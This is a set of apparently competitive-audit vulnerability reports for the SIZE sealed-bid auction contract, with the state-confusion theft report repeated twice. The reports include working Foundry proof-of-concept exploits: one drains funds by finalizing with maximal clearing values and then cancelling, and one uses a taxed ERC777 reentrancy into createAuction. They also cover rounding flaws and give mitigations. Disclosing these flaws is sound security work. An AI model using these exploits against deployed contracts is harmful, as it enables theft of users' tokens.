# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238   # Vulnerability details  HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions) LOC: https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238  ## Description  Auctions in SIZE can be in one of several states, as checked in the atState() modifier:  ``` modifier atState(Auction storage a, States _state) {     if (block.timestamp < a.timings.startTimestamp) {         if (_state != States.Created) revert InvalidState();     } else if (block.timestamp < a.timings.endTimestamp) {         if (_state != States.AcceptingBids) revert InvalidState();     } else if (a.data.lowestQuote != type(uint128).max) {         if (_state != States.Finalized) revert InvalidState();     } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {         if (_state != States.RevealPeriod) revert InvalidState();     } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {         if (_state != States.Voided) revert InvalidState();     } else {         revert();     }     _; } ```  It's important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if finalize() was called.  The value is set to max at createAuction. In finalize, it is set again, using user-controlled input:  ``` // Last filled bid is the clearing price a.data.lowestBase = clearingBase; a.data.lowestQuote = clearingQuote; ```  The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:  ``` // Transfer the left over baseToken if (data.totalBaseAmount != data.filledBase) {     uint128 unsoldBase = data.totalBaseAmount - data.filledBase;     a.params.totalBaseAmount = data.filledBase;     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase); } // Calculate quote amount based on clearing price uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote); ```  Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:  ``` function cancelAuction(uint256 auctionId) external {     Auction storage a = idToAuction[auctionId];     if (msg.sender != a.data.seller) {         revert UnauthorizedCaller();     }     // Only allow cancellations before finalization     // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)     if (a.data.lowestQuote != type(uint128).max) {         revert InvalidState();     }     // Allowing bidders to cancel bids (withdraw quote)     // Auction considered forever States.AcceptingBids but nobody can finalize     a.data.seller = address(0);     a.timings.endTimestamp = type(uint32).max;     emit AuctionCancelled(auctionId);     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount); }  function cancelBid(uint256 auctionId, uint256 bidIndex)     external {     Auction storage a = idToAuction[auctionId];     EncryptedBid storage b = a.bids[bidIndex];     if (msg.sender != b.sender) {         revert UnauthorizedCaller();     }     // Only allow bid cancellations while not finalized or in the reveal period     if (block.timestamp >= a.timings.endTimestamp) {         if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {             revert InvalidState();         }     }     // Prevent any futher access to this EncryptedBid     b.sender = address(0);     // Prevent seller from finalizing a cancelled bid     b.commitment = 0;     emit BidCancelled(auctionId, bidIndex);     SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount); } ```  The attack will look as follows:  1.  attacker uses two contracts - buyer and seller 2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens. 3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X. 4.  after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2\*\*128-1**. 5.  seller contract receives X-Y unsold base tokens and Y quote tokens 6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max` 7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens. 8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.  Note that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.  This was the main constraint to bypass:  ``` uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount); ... data.previousQuotePerBase = quotePerBase; ... if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {             revert InvalidCalldata();         } ```  Since clearingQuote must equal UINT128_MAX, we must satisfy: (2\*\*128-1) \* (2\*\*128-1) / clearingBase = quoteAmount \* (2\*\*128-1) / baseAmount. The solution I found was setting clearingBase to (2\*\*128-1) and quoteAmount = baseAmount.  We also have constraints on reserveQuotePerBase. In createAuction:  ``` if (     FixedPointMathLib.mulDivDown(         auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount     ) > auctionParams.reserveQuotePerBase ) {     revert InvalidReserve(); } ```  While in finalize():  ``` // Only fill if above reserve price if (quotePerBase < data.reserveQuotePerBase) continue; ```  And an important constraint on quoteAmount and minimumBidQuote:  ``` if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {     revert InvalidBidAmount(); } ```  Merging them gives us two equations to substitute variables in:  1.  `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase` 2.  `quoteAmount > minimumBidQuote`  In the POC I've crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.  ## Impact  An attacker can steal all tokens held in the SIZE auction contract.  ## Proof of Concept  Copy the following code in SizeSealed.t.sol  ``` function testAttack() public {     quoteToken = new MockERC20("USD Coin", "USDC", 6);     baseToken = new MockERC20("DAI stablecoin ", "DAI", 18);     // Bootstrap auction contract with some funds     baseToken.mint(address(auction), 1e20);     quoteToken.mint(address(auction), 1e12);     // Create attacker     MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);     MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);     // Print attacker balances     uint256 balance_quote;     uint256 balance_base;     (balance_quote, balance_base) = attacker_seller.balances();     console.log("Starting seller balance: ", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('Starting buyer balance: ', balance_quote, balance_base);     // Create auction     uint256 auction_id = attacker_seller.createAuction(         2**32,  // totalBaseAmount         2**120, // reserveQuotePerBase         2**20, // minimumBidQuote         uint32(block.timestamp), // startTimestamp         uint32(block.timestamp + 1),  // endTimestamp         uint32(block.timestamp + 1), // vestingStartTimestamp         uint32(block.timestamp + 1), // vestingEndTimestamp         0 // cliffPercent     );     // Bid on auction     attacker_buyer.setAuctionId(auction_id);     attacker_buyer.bidOnAuction(         2**30, // baseAmount         2**30  // quoteAmount     );     // Finalize with clearingQuote = clearingBase = 2**128-1     // Will transfer unsold base amount + matched quote amount     uint256[] memory bidIndices = new uint[](1);     bidIndices[0] = 0;     vm.warp(block.timestamp + 10);     attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);     // Cancel auction     // Will transfer back sold base amount     attacker_seller.cancelAuction();     // Cancel bid     // Will transfer back to buyer quoteAmount     attacker_buyer.cancel();     // Net profit of quoteAmount tokens of quoteToken     (balance_quote, balance_base) = attacker_seller.balances();     console.log("End seller balance: ", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('End buyer balance: ', balance_quote, balance_base); } ```  ## Tools Used  Manual audit, foundry tests  ## Recommended Mitigation Steps  Do not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it.
# Lines of code  https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L102   # Vulnerability details  ## Impact The createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.  ## Proof of Concept Forge test  ``` // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.17;  import {Test} from "forge-std/Test.sol";  import {SizeSealedTest} from "./SizeSealed.t.sol"; import {ERC777} from "openzeppelin-contracts/contracts/token/ERC777/ERC777.sol"; import "openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol"; import {MockSeller} from "./mocks/MockSeller.sol"; import {MockERC20} from "./mocks/MockERC20.sol";  contract TaxERC777 is ERC777{     uint32 tax = 50; // 50% tax rate      constructor(string memory name_,         string memory symbol_,         address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}          function mint(address rec, uint256 amount) external{         super._mint(rec, amount, "", "", false);     }      function _beforeTokenTransfer(         address operator,         address from,         address to,         uint256 amount     ) internal override {         if(to == address(0)||from==address(0)){ return;}         // tax just burn for test              }      function _send(         address from,         address to,         uint256 amount,         bytes memory userData,         bytes memory operatorData,         bool requireReceptionAck     ) internal override {         uint tax_amount = amount* tax / 100;         _burn(from, tax_amount, "", "");         super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);     }  }  contract Callback {     MockSeller seller;     uint128 baseToSell;      uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;     uint128 minimumBidQuote = 1e6;     // Auction parameters (cliff unlock)     uint32 startTime;     uint32 endTime;     uint32 unlockTime;     uint32 unlockEnd;     uint128 cliffPercent;      uint8 entry = 0;     uint128 amount_cut_tax;     constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){         seller = _seller;         baseToSell = _baseToSell;         reserveQuotePerBase = _reserveQuotePerBase;         minimumBidQuote = _minimumBidQuote;         startTime = _startTime;         endTime = _endTime;         unlockTime = _unlockTime;         unlockEnd = _unlockEnd;         cliffPercent = _cliffPercent;     }     function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{         if(from==address(0) || to==address(0)){return;}         if(entry == 0){             entry += 1;             amount_cut_tax = baseToSell / 2;             seller.createAuction(                 amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent             );             return;         }         else if(entry == 1){             entry += 1;             ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);             return;         }         entry += 1;         return;              }     function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));} }  contract MyTest is SizeSealedTest {          IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);     function testCreateAuctionFromErc777() public {         TaxERC777 tax777Token;         address[] memory addrme = new address[](1);         addrme[0] = address(this);         tax777Token = new TaxERC777("t7", "t7", addrme);                  seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));         Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);          // just without adding more function to MockSeller         vm.startPrank(address(seller));         _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256("ERC777TokensSender"), address(callbackImpl));         tax777Token.approve(address(callbackImpl), type(uint256).max);         vm.stopPrank();         seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );         uint auction_balance = tax777Token.balanceOf(address(auction));         uint128 auction1_amount = get_auction_base_amount(1);         uint128 auction2_amount = get_auction_base_amount(2);         emit log_named_uint("auction balance", auction_balance);         emit log_named_uint("auction 1 totalBaseAmount", auction1_amount);         emit log_named_uint("auction 2 totalBaseAmount", auction2_amount);         assertGt(auction1_amount+auction2_amount, auction_balance);     }      function get_auction_base_amount(uint id) private returns (uint128){         (, ,AuctionParameters memory para) = auction.idToAuction(id);         return para.totalBaseAmount;     } } ```  You should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24` ``` forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX ```  Test passed and print logs: ``` ... ...     ├─ [4900] SizeSealed::idToAuction(1) [staticcall]     │   └─ ← (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     ├─ [4900] SizeSealed::idToAuction(2) [staticcall]     │   └─ ← (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     ├─ emit log_named_uint(key: auction balance, val: 10000000000000000000)     ├─ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)     ├─ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)     └─ ← ()  Test result: ok. 1 passed; 0 failed; finished in 7.64s ```  ## Tools Used  foundry  ## Recommended Mitigation Steps check re-entrancy
# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277   # Vulnerability details  ## Impact When the seller finalizes his auction, all bids are sorted according to the `quotePerBase` and it's calculated using the `FixedPointMathLib.mulDivDown()`.  And the earliest bid will be used first for the same `quotePerBase` but this ratio is not strict enough so that the worse bid might be filled than the better one.  As a result, the seller might receive fewer quote token than he wants.  ## Proof of Concept This is the test to show the scenario.  ```solidity     function testAuditWrongSorting() public {         // this test will show that it is possible the seller can not claim the best bid because of the inaccurate comparison in finalization         uint128 K = 1<<64;         baseToSell = K + 2;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(K+1, K, "Worse bidder");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(K+2, K+1, "Better bidder"); // This is the better bid because (K+1)/(K+2) > K/(K+1)          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 1; // the seller is smart enough to choose the correct order to (1, 0)         bidIndices[1] = 0;          vm.expectRevert(ISizeSealed.InvalidSorting.selector);         seller.finalize(bidIndices, K+2, K+1); // this reverts because of #273          // next the seller is forced to call the finalize with parameter K+1, K preferring the first bidder         bidIndices[0] = 0;         bidIndices[1] = 1;         seller.finalize(bidIndices, K+1, K);          // at this point the seller gets K quote tokens while he could get K+1 quote tokens with the better bidder         assertEq(quoteToken.balanceOf(address(seller)), K);     } ```  This is the output of the test.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [PASS] testAuditWrongSorting() (gas: 984991)     Test result: ok. 1 passed; 0 failed; finished in 7.22ms ```  When it calculates the [quotePerBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269), they are same each other with `(base, quote) = (K+1, K) and (K+2, K+1) when K = 1<<64`.  So the seller can receive `K+1` of the quote token but he got `K`.  I think `K` is realistic enough with the 18 decimals token because K is around 18 * 1e18.  ## Tools Used Foundry  ## Recommended Mitigation Steps As we can see from the test, it's not strict enough to compare bidders using `quotePerBase`.  We can compare them by multiplying them like below.  $\frac {quote1}{base1} >= \frac{quote2}{base2} <=> quote1 * base2 >= quote2 * base1 $  So we can add 2 elements to `FinalizeData` struct and modify [this comparison](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277) like below.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;         uint128 previousQuote; //++++++++++++         uint128 previousBase; //+++++++++++     } ```  ```solidity     uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);     if (quotePerBase >= data.previousQuotePerBase) {         // If last bid was the same price, make sure we filled the earliest bid first         if (quotePerBase == data.previousQuotePerBase) {             uint256 currentMult = uint256(b.quoteAmount) * data.previousBase; //mult for current bid             uint256 previousMult = uint256(data.previousQuote) * baseAmount; //mult for the previous bid              if (currentMult > previousMult) { // current bid is better                 revert InvalidSorting();                 }              if (currentMult == previousMult && data.previousIndex > bidIndex) revert InvalidSorting();         } else {             revert InvalidSorting();         }     }      ...      data.previousBase = baseAmount;     data.previousQuote = b.quoteAmount; ```
# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325   # Vulnerability details  ## Impact Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.  The main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.  If there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn't have enough balance of quote token.  ## Proof of Concept After the auction was finalized, the seller receives the `filledQuote` amount of quote token using [data.filledBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325).  ```solidity     // Calculate quote amount based on clearing price     uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); ```  But when the bidders withdraw the funds using `withdraw()`, they offer the quote token [using this formula](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382).  ```solidity     // Refund unfilled quoteAmount on first withdraw     if (b.quoteAmount != 0) {         uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);         uint256 refundedQuote = b.quoteAmount - quoteBought;         b.quoteAmount = 0;          SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);     } ```  Even if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.  This is the test to show the scenario.  ```solidity     function testAuditBidderMoneyLock() public {         // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller         uint128 K = 1 ether;         baseToSell = 4*K;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, "Honest bidder");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, "Honest bidder");          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 0;         bidIndices[1] = 1;          seller.finalize(bidIndices, 2*K, 2*K+1);         emit log_string("Seller claimed");         // seller claimed 4*K+2         assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);         // contract has K+1 quote token left         assertEq(quoteToken.balanceOf(address(auction)), K+1);          // bidder1 withdraws         bidder1.withdraw();         emit log_string("Bidder 1 withdrew");         // contract has K quote token left         assertEq(quoteToken.balanceOf(address(auction)), K);         // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens         // but the protocol reverts because of insufficient quote tokens         bidder2.withdraw();         emit log_string("Bidder 2 withdrew"); // will not happen     } ```  The test result shows the seller charged more quote token than the bidders offer so the last bidder can't withdraw his unused quote token because the contract doesn't have enough balance.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)     Logs:     Seller claimed     Bidder 1 withdrew      Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms      Failing tests:     Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985) ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Currently, the `FinalizeData` struct contains the `filledBase` only and calculates the `filledQuote` using the clearing price.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;     } ```  I think we should add one more field `filledQuote` and update it during auction finalization.  And the seller can recieve the sum of `filledQuote` of all bidders to avoid the rounding issue.  Also, each bidder can pay the `filledQuote` of quote token and receive the `filledBase` of base token without calculating again using the clearing price.
# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238   # Vulnerability details  HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions) LOC: https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238  ## Description  Auctions in SIZE can be in one of several states, as checked in the atState() modifier:  ``` modifier atState(Auction storage a, States _state) {     if (block.timestamp < a.timings.startTimestamp) {         if (_state != States.Created) revert InvalidState();     } else if (block.timestamp < a.timings.endTimestamp) {         if (_state != States.AcceptingBids) revert InvalidState();     } else if (a.data.lowestQuote != type(uint128).max) {         if (_state != States.Finalized) revert InvalidState();     } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {         if (_state != States.RevealPeriod) revert InvalidState();     } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {         if (_state != States.Voided) revert InvalidState();     } else {         revert();     }     _; } ```  It's important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if finalize() was called.  The value is set to max at createAuction. In finalize, it is set again, using user-controlled input:  ``` // Last filled bid is the clearing price a.data.lowestBase = clearingBase; a.data.lowestQuote = clearingQuote; ```  The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:  ``` // Transfer the left over baseToken if (data.totalBaseAmount != data.filledBase) {     uint128 unsoldBase = data.totalBaseAmount - data.filledBase;     a.params.totalBaseAmount = data.filledBase;     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase); } // Calculate quote amount based on clearing price uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote); ```  Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:  ``` function cancelAuction(uint256 auctionId) external {     Auction storage a = idToAuction[auctionId];     if (msg.sender != a.data.seller) {         revert UnauthorizedCaller();     }     // Only allow cancellations before finalization     // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)     if (a.data.lowestQuote != type(uint128).max) {         revert InvalidState();     }     // Allowing bidders to cancel bids (withdraw quote)     // Auction considered forever States.AcceptingBids but nobody can finalize     a.data.seller = address(0);     a.timings.endTimestamp = type(uint32).max;     emit AuctionCancelled(auctionId);     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount); }  function cancelBid(uint256 auctionId, uint256 bidIndex)     external {     Auction storage a = idToAuction[auctionId];     EncryptedBid storage b = a.bids[bidIndex];     if (msg.sender != b.sender) {         revert UnauthorizedCaller();     }     // Only allow bid cancellations while not finalized or in the reveal period     if (block.timestamp >= a.timings.endTimestamp) {         if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {             revert InvalidState();         }     }     // Prevent any futher access to this EncryptedBid     b.sender = address(0);     // Prevent seller from finalizing a cancelled bid     b.commitment = 0;     emit BidCancelled(auctionId, bidIndex);     SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount); } ```  The attack will look as follows:  1.  attacker uses two contracts - buyer and seller 2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens. 3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X. 4.  after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2\*\*128-1**. 5.  seller contract receives X-Y unsold base tokens and Y quote tokens 6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max` 7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens. 8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.  Note that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.  This was the main constraint to bypass:  ``` uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount); ... data.previousQuotePerBase = quotePerBase; ... if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {             revert InvalidCalldata();         } ```  Since clearingQuote must equal UINT128_MAX, we must satisfy: (2\*\*128-1) \* (2\*\*128-1) / clearingBase = quoteAmount \* (2\*\*128-1) / baseAmount. The solution I found was setting clearingBase to (2\*\*128-1) and quoteAmount = baseAmount.  We also have constraints on reserveQuotePerBase. In createAuction:  ``` if (     FixedPointMathLib.mulDivDown(         auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount     ) > auctionParams.reserveQuotePerBase ) {     revert InvalidReserve(); } ```  While in finalize():  ``` // Only fill if above reserve price if (quotePerBase < data.reserveQuotePerBase) continue; ```  And an important constraint on quoteAmount and minimumBidQuote:  ``` if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {     revert InvalidBidAmount(); } ```  Merging them gives us two equations to substitute variables in:  1.  `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase` 2.  `quoteAmount > minimumBidQuote`  In the POC I've crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.  ## Impact  An attacker can steal all tokens held in the SIZE auction contract.  ## Proof of Concept  Copy the following code in SizeSealed.t.sol  ``` function testAttack() public {     quoteToken = new MockERC20("USD Coin", "USDC", 6);     baseToken = new MockERC20("DAI stablecoin ", "DAI", 18);     // Bootstrap auction contract with some funds     baseToken.mint(address(auction), 1e20);     quoteToken.mint(address(auction), 1e12);     // Create attacker     MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);     MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);     // Print attacker balances     uint256 balance_quote;     uint256 balance_base;     (balance_quote, balance_base) = attacker_seller.balances();     console.log("Starting seller balance: ", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('Starting buyer balance: ', balance_quote, balance_base);     // Create auction     uint256 auction_id = attacker_seller.createAuction(         2**32,  // totalBaseAmount         2**120, // reserveQuotePerBase         2**20, // minimumBidQuote         uint32(block.timestamp), // startTimestamp         uint32(block.timestamp + 1),  // endTimestamp         uint32(block.timestamp + 1), // vestingStartTimestamp         uint32(block.timestamp + 1), // vestingEndTimestamp         0 // cliffPercent     );     // Bid on auction     attacker_buyer.setAuctionId(auction_id);     attacker_buyer.bidOnAuction(         2**30, // baseAmount         2**30  // quoteAmount     );     // Finalize with clearingQuote = clearingBase = 2**128-1     // Will transfer unsold base amount + matched quote amount     uint256[] memory bidIndices = new uint[](1);     bidIndices[0] = 0;     vm.warp(block.timestamp + 10);     attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);     // Cancel auction     // Will transfer back sold base amount     attacker_seller.cancelAuction();     // Cancel bid     // Will transfer back to buyer quoteAmount     attacker_buyer.cancel();     // Net profit of quoteAmount tokens of quoteToken     (balance_quote, balance_base) = attacker_seller.balances();     console.log("End seller balance: ", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('End buyer balance: ', balance_quote, balance_base); } ```  ## Tools Used  Manual audit, foundry tests  ## Recommended Mitigation Steps  Do not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it.
